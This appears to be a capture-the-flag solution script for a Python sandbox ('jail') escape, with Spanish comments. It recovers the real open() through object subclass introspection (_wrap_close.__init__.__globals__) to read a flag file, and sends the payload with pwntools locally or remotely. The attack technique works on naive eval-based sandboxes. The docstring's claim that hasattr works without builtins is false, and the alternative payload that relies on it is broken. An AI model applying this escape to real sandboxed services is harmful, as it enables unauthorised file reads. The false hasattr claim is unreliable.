"""
Escape: Python class hierarchy sin builtins.

Aunque __builtins__ = {}, Python object introspection sigue funcionando
porque .__class__, .__base__, .__subclasses__() son atributos del modelo
de objetos de Python, no funciones builtin.

Payload (una sola linea):
  ().__class__.__base__.__subclasses__()

Esto devuelve todas las subclases de 'object'. Entre ellas hay clases
cuyos __init__.__globals__ contienen acceso a builtins reales.

Payload completo:
  [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['open']('/home/ctf/flag.txt').read()

Alternativa (buscar clase con 'open' en globals):
  [c for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,'__globals__') and 'open' in c.__init__.__globals__][0].__init__.__globals__['open']('/home/ctf/flag.txt').read()

Nota: hasattr funciona como atributo de los objetos aunque no este en builtins.
"""
from pwn import *
import sys

if args.REMOTE:
    p = remote(sys.argv[2], int(sys.argv[3]))
else:
    p = process(['python3', 'app/jail.py'])

p.recvuntil(b'>>> ')

# Payload que no usa ningun builtin
payload = b"[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['open']('/home/ctf/flag.txt').read()"
p.sendline(payload)
print(p.recvline().decode(errors='replace'))
